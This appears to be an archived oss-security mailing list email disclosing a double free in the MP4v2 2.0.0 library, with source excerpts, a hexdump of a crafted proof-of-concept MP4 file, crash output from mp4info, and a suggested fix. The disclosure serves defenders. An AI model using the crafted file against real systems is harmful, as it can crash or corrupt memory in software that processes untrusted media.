X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4103" "Friday" "13" "July" "2018" "14:09:48" "+0800" "Ruikai Liu" "lrk700@gmail.com" "<CAB6DpjU9+MN3j-asqGc7BxfLoVR=LLA+12hZvP8R9d8cg85+Yg@mail.gmail.com>" "134" "[oss-security] Fastbin double free in MP4v2 2.0.0" nil nil nil "7" "2018071306:09:48" "[oss-security] Fastbin double free in MP4v2 2.0.0" (number mark "U       lrk700@gmail Jul 13  134/4103  " thread-indent "\"[oss-security] Fastbin double free in MP4v2 2.0.0\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7398 invoked by uid 550); 13 Jul 2018 09:29:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28299 invoked from network); 13 Jul 2018 06:10:12 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=/ng2rvVzagsNlRZ/yoNv7dtHtMqdKoGGO4vLTm/K/5c=;
        b=tLyQHc8h9YkPsdnN2WDLKwznbHrJie7sdO/UNU6I1vnmviBFDqqkynFSxKbKQV7xe7
         gOh6qff7DsxjF2l5NxkPootb8PTjXdBB5H0opCQAmjEvv9ecoC6H8f+vgkUhPv8dy8J5
         wEvFRNZ2wXKMhtv48G1rU+bQ1zl55B2TcaM0gz1uXk3X3viQ7/oLZpdkYIDOWknG9zU2
         Xs6/GjI+N+I0tipl3ojxjtCkmF2w2ZjGro4HYi6FDE/HiLpzaPJpsqjpXe5yXI5K4Q7Q
         uCOPia0xPgGsSaYVabUBy9CItdVItX+vxJ25DHLyifHrhcw6LCfEptI7RuzsN8ipoXRM
         lFDQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=/ng2rvVzagsNlRZ/yoNv7dtHtMqdKoGGO4vLTm/K/5c=;
        b=TaAYoRkxEXb19MG3vYcC5cVDfHv4Bd6phXoDGuqAxxAedaAy3Wt296b5zh2I6PdMU7
         BvKtt0TtePKL763rjLEsP2l44d/l5XPrOD5+sJpuv0yF0hpLSf4AdSEqcTYC260Gq5zz
         ed/OncZmVGSxv0CNppBNb6kZAqcYgCXhNulTV66IJF5xD2Uz20BJDbILapbztArcCQnM
         +dwAw+tX0809wPy1pR/2ULXs645IoZrTw8uy34Cuz9tq3Tz10YRaAeepMQiy8+cMA1//
         FqEPjtqrtalQjBrsDI+RdL2/7nYrW24lVMQDDhjJkx53jmDe4wIV8zVEdFVFbyy41Fxv
         Urqg==
X-Gm-Message-State: AOUpUlFZUeneMKxMhTzd3/Ux0lyObdBnmN1OreT2GEDm2bQuVNS7DuUf
	HuA13/aK0nXC1NpY5RK9OW2RlX6JsO2dyk0qvWVUTw==
X-Google-Smtp-Source: AAOMgpcRk8ELQ8LzmJjUCl5wcfhN52i5zVBN61/0t79mVzevRzpC78jNUyZUw2rWAA9AlhPnYrYkuGQcqHngi3vg20c=
X-Received: by 2002:a24:7a84:: with SMTP id a126-v6mr3647796itc.111.1531462200226;
 Thu, 12 Jul 2018 23:10:00 -0700 (PDT)
MIME-Version: 1.0
From: Ruikai Liu <lrk700@gmail.com>
Date: Fri, 13 Jul 2018 14:09:48 +0800
Message-ID: <CAB6DpjU9+MN3j-asqGc7BxfLoVR=LLA+12hZvP8R9d8cg85+Yg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary="0000000000006e77050570db5409"
Subject: [oss-security] Fastbin double free in MP4v2 2.0.0

--0000000000006e77050570db5409
Content-Type: text/plain; charset="UTF-8"

Hi,

There's a double free issue in MP4v2 2.0.0, a legacy library dealing with
MP4 media file.

========= Details =========

The buffer is first allocated during the construction of a
`MP4Mp4vAtom::MP4Mp4vAtom` in src/atom_mp4v.cpp:

 46     MP4StringProperty* pProp =
 47         new MP4StringProperty(*this, "compressorName");
 48     pProp->SetFixedLength(32);
 49     pProp->SetCountedFormat(true);
 50     pProp->SetValue("");
 51     AddProperty(pProp); /* 6 */

In which `SetValue` would allocate a buffer of 32 bytes for the default
value(src/mp4property.cpp):

 534         if (m_values[index] == NULL) {
 535             m_values[index] = (uint8_t*)MP4Calloc(m_fixedValueSize);
 536             m_valueSizes[index] = m_fixedValueSize;
 537         }

Later, when parsing the atom, a try-catch block is used(src/mp4atom.cpp):

 194     try {
 195         pAtom->Read();
 196     }
 197     catch (Exception* x) {
 198         // delete atom and rethrow so we don't leak memory.
 199         delete pAtom;
 200         throw x;
 201     }

And calling the atom's `Read()` would then invoke reading its
`MP4StringProperty` too, in which case the buffer allocated above would be
freed and re-allocaed for the actual value(src/mp4property.cpp):

 390     for( uint32_t i = begin; i < max; i++ ) {
 391         char*& value = m_values[i];
 392
 393         // Generally a default atom setting, e.g. see atom_avc1.cpp,
"JVT/AVC Coding"; we'll leak this string if
 394         // we don't free.  Note that MP4Free checks for null.
 395         MP4Free(value);
 396
 397         if( m_useCountedFormat ) {
 398             value = file.ReadCountedString( (m_useUnicode ? 2 : 1),
m_useExpandedCount, m_fixedLength );
 399         }

However, a crafted file could result in an exception in
`ReadCountedString`(src/mp4file_io.cpp):

 93     if( file->read( buf, bufsiz, nin ))
 94         throw new PlatformException( "read failed",
sys::getLastError(), __FILE__, __LINE__, __FUNCTION__ );
 95     if( nin != bufsiz )
 96         throw new Exception( "not enough bytes, reached end-of-file",
__FILE__, __LINE__, __FUNCTION__ );

So the exception handler would invoke the deconstructor of `pAtom`, which
would delete its properties and free the dangling pointer for the second
time.

========= POC =========

Here's a POC file:

root@debian:~# hexdump -Cv c1.mp4
00000000  00 00 00 18 66 74 79 70  6d 70 34 32 01 2a 00 7e
|....ftypmp42.*.~|
00000010  6d 70 34 32 69 73 6f 6d  00 00 00 4a 6d 70 34 76
|mp42isom...Jmp4v|
00000020  6d 70 ff ff 00 01 33 a9  00 7f ff 63 00 05 00 65
|mp....3....c...e|
00000030  00 00 00 07 63 61 74 67  00 1b ff f0 64 78 74 40
|....catg....dxt@|
00000040  00 de ff 00 00 ff ff ff  ff 00 1a 00 0b 00 19 72
|...............r|
00000050  8b 00 00 00 10 23 11 64  61 74 60 00 00 00 ff 7f
|.....#.dat`.....|
00000060  ff ff                                             |..|
00000062

The `prev_inuse` flag is ignored for fastbin, and there are some other
buffers freed during the double free. Some of them happened to be of the
same size(32 bytes) and the double free check is passed for 64-bits MP4v2.
Yet for 32-bits MP4v2 those buffers are of different size the program would
abort.

root@debian:~/src/mp4v2-2.0.0-orig-x64# dpkg -s mp4v2-utils
Package: mp4v2-utils
Status: install ok installed
Priority: optional
Section: sound
Installed-Size: 281
Maintainer: Debian Multimedia Maintainers <
pkg-multimedia-maintainers@lists.alioth.debian.org>
Architecture: i386
Source: mp4v2 (2.0.0~dfsg0-5)
Version: 2.0.0~dfsg0-5+b1
Depends: libmp4v2-2 (= 2.0.0~dfsg0-5+b1), libc6 (>= 2.4), libgcc1 (>=
1:4.2), libstdc++6 (>= 5.2)
...

root@debian:~# mp4info c1.mp4
mp4info version -r
c1.mp4:
*** Error in `mp4info': double free or corruption (fasttop): 0x56d883d0 ***
...

========= Fix =========

One way to fix the bug is to clear the dangling pointer after the the first
free.

========= Reference =========

https://code.google.com/archive/p/mp4v2/



-- 
Best regards,

Ruikai Liu

--0000000000006e77050570db5409--
